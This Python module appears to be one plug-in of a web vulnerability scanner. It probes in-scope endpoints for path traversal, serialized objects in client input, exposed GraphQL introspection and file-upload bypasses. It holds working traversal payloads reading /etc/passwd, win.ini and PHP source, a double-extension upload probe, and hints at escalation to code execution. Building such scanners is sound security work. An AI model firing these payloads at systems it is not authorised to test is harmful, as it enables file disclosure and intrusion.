#!/usr/bin/env python3
"""web-extra depth kit — LFI/path-traversal, file-upload, deserialization, GraphQL.

Four server-side classes the other kits do not cover, each tested several ways
and classified by response signatures / diffing rather than status codes. Every
request goes through ``ctx.fetch`` (SSRF-safe, mockable); findings never carry
tokens or full bodies. Respects ``ctx.baseline`` (SPA catch-all) and
``ctx.in_scope``.

Follows the pattern of ``tools/hunter/kits/injection.py``.
"""
from __future__ import annotations

import base64
import os
import re
import sys
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

_REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)

from tools.hunter.contract import (  # noqa: E402
    Finding,
    V_CONFIRMED,
    V_POSSIBLE,
    register,
)

try:  # optional reuse; lean inline fallbacks keep the kit self-contained
    from tools import deser_probe as _deser  # noqa: E402
except Exception:  # pragma: no cover
    _deser = None

_SKIP_METHODS = ("DELETE", "TRACE", "CONNECT")
_BODY_METHODS = ("POST", "PUT", "PATCH")
_MAX_PARAMS = 20

# --- signatures -------------------------------------------------------------
_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.S)
_WININI_RE = re.compile(r"\[fonts\]|\[extensions\]", re.I)
_PHP_B64 = "PD9waHA"  # base64("<?php")

_LFI_PAYLOADS = [
    ("unix-traversal", "../../../../../../../../etc/passwd", _PASSWD_RE),
    ("unix-enc", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", _PASSWD_RE),
    ("unix-doubenc", "..%252f..%252f..%252fetc%252fpasswd", _PASSWD_RE),
    ("unix-absolute", "/etc/passwd", _PASSWD_RE),
    ("unix-nullbyte", "../../../../../../etc/passwd%00", _PASSWD_RE),
    ("win-traversal", "..\\..\\..\\..\\..\\..\\windows\\win.ini", _WININI_RE),
    ("php-filter", "php://filter/convert.base64-encode/resource=index.php", None),
]

# serialized-object markers (value prefixes / substrings).
_DESER_MARKERS = [
    ("java-b64", re.compile(r"rO0[A-Za-z0-9+/=]{8,}")),
    ("java-raw", re.compile(r"\xac\xed\x00\x05")),
    ("php-serialized", re.compile(r'(?:^|[;{])[aOs]:\d+:[:{"]')),
    ("dotnet-b64", re.compile(r"AAEAAAD/////")),
    ("python-pickle-b64", re.compile(r"gAN[A-Za-z0-9+/=]{6,}")),
]

_GQL_PROBE_PATHS = ("/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql")
_INTROSPECTION = '{"query":"query{__schema{queryType{name} types{name}}}"}'
_TYPENAME = '{"query":"{__typename}"}'

_UPLOAD_HINT = re.compile(r"(upload|avatar|image|photo|file|media|attachment|import|document)", re.I)


# --- helpers ----------------------------------------------------------------
def _auth(ctx):
    try:
        return dict(getattr(ctx.account_a, "headers", {}) or {})
    except Exception:
        return {}


def _fetch(ctx, method, url, body=None, extra=None):
    f = getattr(ctx, "fetch", None)
    if f is None:
        return None
    h = _auth(ctx)
    if extra:
        h.update(extra)
    try:
        return f(method, url, headers=h or None, body=body)
    except Exception:
        return None


def _noise(ctx, r):
    if r is None:
        return True
    b = getattr(ctx, "baseline", None)
    if b is not None:
        try:
            return bool(b.is_catchall(r.status, r.body))
        except Exception:
            return False
    return False


def _host(url):
    try:
        return (urlparse(url).hostname or "").lower()
    except Exception:
        return ""


def _query_params(url):
    try:
        return list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())
    except Exception:
        return []


def _set_query(url, name, value):
    p = urlparse(url)
    q = parse_qs(p.query, keep_blank_values=True)
    q[name] = [value]
    return urlunparse(p._replace(query=urlencode({k: v[0] for k, v in q.items()}, doseq=False)))


def _snip(body, needle="", width=90):
    if not body:
        return ""
    i = body.find(needle) if needle else -1
    chunk = body[:width] if i < 0 else body[max(0, i - 10):][:width]
    return " ".join(chunk.split())[:width]


def _mk(cls, title, url, technique, *, method="GET", severity="high",
        confidence="firm", verdict=V_POSSIBLE, evidence=None, repro=None,
        kill=None, chain=None):
    return Finding(cls=cls, title=title, severity=severity, confidence=confidence,
                   axis=technique.split(":")[0], technique=technique, method=method,
                   url=url, evidence=evidence or {}, verdict=verdict,
                   repro=repro or [], kill_reasons=kill or [], chain_hints=chain or [])


# --- LFI --------------------------------------------------------------------
def _probe_lfi(ctx, url):
    out = []
    params = _query_params(url)[:_MAX_PARAMS]
    if not params:
        return out
    base = _fetch(ctx, "GET", url)
    if _noise(ctx, base):
        return out
    base_body = (base.body or "") if base else ""
    for name in params:
        for tech, payload, sig in _LFI_PAYLOADS:
            r = _fetch(ctx, "GET", _set_query(url, name, payload))
            if _noise(ctx, r):
                continue
            body = r.body or ""
            hit = False
            evidence_key = ""
            if sig is not None:
                if sig.search(body) and not sig.search(base_body):
                    hit, evidence_key = True, _snip(body, "root:" if "passwd" in payload else "[", 100)
            elif _PHP_B64 in body and _PHP_B64 not in base_body:
                hit, evidence_key = True, "base64-encoded PHP source returned"
            if hit:
                out.append(_mk(
                    "lfi-path-traversal",
                    "Local file read / path traversal",
                    url, f"lfi:{tech}", severity="high",
                    confidence="confirmed", verdict=V_CONFIRMED,
                    evidence={"param": name, "payload": payload, "evidence": evidence_key},
                    repro=[f"Set query parameter '{name}' to: {payload}",
                           "The response contains protected file contents."],
                    chain=["LFI -> source/secret disclosure -> RCE (log poisoning / wrappers)"],
                ))
                break  # one proof per param
    return out


# --- deserialization --------------------------------------------------------
def _probe_deser(ctx, url):
    out = []
    # look in query values and the account cookie for a serialized blob.
    candidates = []
    p = urlparse(url)
    for k, vals in parse_qs(p.query, keep_blank_values=True).items():
        for v in vals:
            candidates.append(("query:" + k, v))
    cookie = _auth(ctx).get("Cookie", "")
    if cookie:
        candidates.append(("cookie", cookie))
    for where, value in candidates:
        for tech, rx in _DESER_MARKERS:
            if rx.search(value or ""):
                engine = tech
                if _deser is not None:
                    try:
                        det = _deser.detect(value)  # best-effort reuse
                        if det:
                            engine = str(det)
                    except Exception:
                        pass
                out.append(_mk(
                    "deserialization",
                    "Serialized object accepted from the client (deserialization sink)",
                    url, f"deser:{tech}", severity="high", confidence="firm",
                    verdict=V_POSSIBLE,
                    evidence={"location": where, "format": engine},
                    repro=[f"A serialized object ({tech}) travels in {where}.",
                           "Replay with a crafted (non-destructive) object to confirm the sink."],
                    kill=["sink detected; weaponisation unconfirmed without a gadget/OOB"],
                    chain=["insecure deserialization -> RCE via a known gadget chain"],
                ))
                break
    return out


# --- GraphQL ----------------------------------------------------------------
def _graphql_targets(ctx):
    targets = []
    for ep in (ctx.endpoints or []):
        u = ep.get("url", "") if isinstance(ep, dict) else ""
        if u and "graphql" in u.lower() and ctx.in_scope(_host(u)):
            targets.append(u)
    # probe common paths off the base
    base = getattr(ctx, "base_url", "") or ""
    if base:
        for path in _GQL_PROBE_PATHS:
            cand = urljoin(base, path.lstrip("/"))
            if ctx.in_scope(_host(cand)):
                targets.append(cand)
    seen, out = set(), []
    for t in targets:
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out


def _probe_graphql(ctx):
    out = []
    for url in _graphql_targets(ctx):
        # is it a GraphQL endpoint at all?
        r = _fetch(ctx, "POST", url, body=_TYPENAME, extra={"Content-Type": "application/json"})
        if _noise(ctx, r) or r is None:
            continue
        body = r.body or ""
        if "__typename" not in body and '"data"' not in body and "errors" not in body:
            continue
        # introspection enabled?
        ri = _fetch(ctx, "POST", url, body=_INTROSPECTION, extra={"Content-Type": "application/json"})
        ib = (ri.body or "") if ri and not _noise(ctx, ri) else ""
        if "__schema" in ib and ("types" in ib or "queryType" in ib):
            out.append(_mk(
                "graphql", "GraphQL introspection enabled (schema disclosed)",
                url, "graphql:introspection", severity="medium", confidence="confirmed",
                verdict=V_CONFIRMED,
                evidence={"snippet": _snip(ib, "__schema", 100)},
                repro=[f"POST an introspection query to {url}",
                       "The full schema (types/queries) is returned."],
                chain=["introspection -> map hidden mutations/fields -> IDOR/auth-bypass via node(id)"],
            ))
        else:
            out.append(_mk(
                "graphql", "GraphQL endpoint exposed (introspection appears disabled)",
                url, "graphql:endpoint", severity="info", confidence="firm",
                verdict=V_POSSIBLE,
                evidence={"snippet": _snip(body, "", 80)},
                repro=[f"POST {{__typename}} to {url} -> a GraphQL response.",
                       "Try field-suggestion (clairvoyance) and alias/batching next."],
                kill=["endpoint present; no high-impact issue confirmed yet"],
                chain=["GraphQL -> alias/batching amplification; arg injection; IDOR via node(id)"],
            ))
    return out


# --- file upload ------------------------------------------------------------
def _probe_upload(ctx, url, method):
    """Without allow_write: a hypothesis describing the manual test. With
    allow_write: a best-effort benign multipart with a double-extension bypass."""
    looks_upload = bool(_UPLOAD_HINT.search(url))
    if not looks_upload:
        return []
    if not getattr(ctx, "allow_write", False):
        return [_mk(
            "file-upload", "Possible unrestricted file upload (manual test required)",
            url, "file-upload:hypothesis", method=method, severity="medium",
            confidence="tentative", verdict=V_POSSIBLE,
            evidence={"note": "upload-like endpoint; writes gated behind allow_write"},
            repro=["Upload a benign file, then try bypasses: double extension "
                   "(.php.jpg), content-type spoof, magic-byte prefix, SVG/XML, "
                   "path traversal in the filename; confirm retrieval/execution."],
            kill=["not actively tested (read-only run)"],
            chain=["malicious upload -> stored XSS / RCE / SSRF via parser"],
        )]
    # active, benign probe (double-extension + harmless content)
    boundary = "----hunterboundary"
    filename = "hunter-probe.php.jpg"
    content = "GIF89a; harmless-upload-probe"
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
            f"filename=\"{filename}\"\r\nContent-Type: image/jpeg\r\n\r\n{content}\r\n"
            f"--{boundary}--\r\n")
    r = _fetch(ctx, method, url, body=body,
               extra={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    if _noise(ctx, r) or r is None:
        return []
    if r.status in (200, 201, 202):
        return [_mk(
            "file-upload", "File upload accepted a double-extension payload",
            url, "file-upload:double-extension", method=method, severity="high",
            confidence="firm", verdict=V_POSSIBLE,
            evidence={"filename": filename, "status": r.status},
            repro=[f"{method} a multipart file named {filename} -> {r.status} accepted.",
                   "Retrieve the stored file and confirm it executes / is served as script."],
            kill=["upload accepted; execution/retrieval not yet confirmed"],
            chain=["malicious upload -> stored XSS / RCE"],
        )]
    return []


# --- the kit ----------------------------------------------------------------
class WebExtraKit:
    name = "web-extra"
    classes = ("lfi-path-traversal", "file-upload", "deserialization", "graphql")

    def applicable(self, ctx) -> bool:
        if ctx is None or getattr(ctx, "fetch", None) is None:
            return False
        if getattr(ctx, "base_url", ""):
            return True
        return bool(getattr(ctx, "endpoints", None))

    def run(self, ctx) -> list:
        if getattr(ctx, "fetch", None) is None:
            return []
        findings = []
        for ep in (ctx.endpoints or []):
            if not isinstance(ep, dict):
                continue
            url = ep.get("url", "")
            method = str(ep.get("method", "GET")).upper()
            if not url or method in _SKIP_METHODS or not ctx.in_scope(_host(url)):
                continue
            try:
                findings += _probe_lfi(ctx, url)
                findings += _probe_deser(ctx, url)
                findings += _probe_upload(ctx, url, method if method in _BODY_METHODS else "POST")
            except Exception:
                continue
        try:
            findings += _probe_graphql(ctx)
        except Exception:
            pass
        # dedupe
        seen, out = set(), []
        for f in findings:
            key = (f.cls, f.technique, f.url)
            if key in seen:
                continue
            seen.add(key)
            out.append(f)
        return out


register(WebExtraKit())
